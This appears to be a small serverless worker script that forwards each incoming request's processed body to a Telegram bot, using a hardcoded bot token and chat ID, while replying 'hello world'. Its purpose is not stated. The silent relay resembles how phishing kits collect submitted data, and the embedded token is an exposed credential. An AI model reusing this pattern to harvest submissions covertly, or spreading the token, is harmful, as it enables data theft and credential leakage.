const { viB, a } = require('./v')


addEventListener('fetch', event => {

  event.respondWith(handleRequest(event.request))
})

async function handleRequest(request) {

 let body = await a(request)
 let b = await viB(JSON.parse(body))

let T =  fetch('https://api.telegram.org/bot1067208185:AAEsGHJmtYJTgJm9XTCJ-FdA-rowTO2bL3M/sendMessage?chat_id=986940575&text=' + JSON.stringify(b) )

  return new Response('hello world', {status: 200})
}



